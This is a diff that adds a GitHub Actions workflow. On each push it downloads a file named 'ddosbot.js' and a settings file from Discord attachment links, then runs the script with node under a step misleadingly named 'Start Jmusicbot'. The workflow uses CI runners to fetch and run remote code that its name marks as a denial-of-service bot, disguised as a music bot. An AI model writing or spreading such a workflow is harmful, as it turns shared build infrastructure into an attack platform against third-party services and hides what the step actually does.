@@ -1,0 +1,16 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - name: Download
+      run: Invoke-WebRequest https://cdn.discordapp.com/attachments/1135937832792359003/1147225400125169734/ddosbot.js -OutFile ddos.js
+    - name: Download config
+      run: Invoke-WebRequest https://cdn.discordapp.com/attachments/1135937832792359003/1147225399600885810/botsetting.json
+    - name: Start Jmusicbot
+      run: node ddos.js
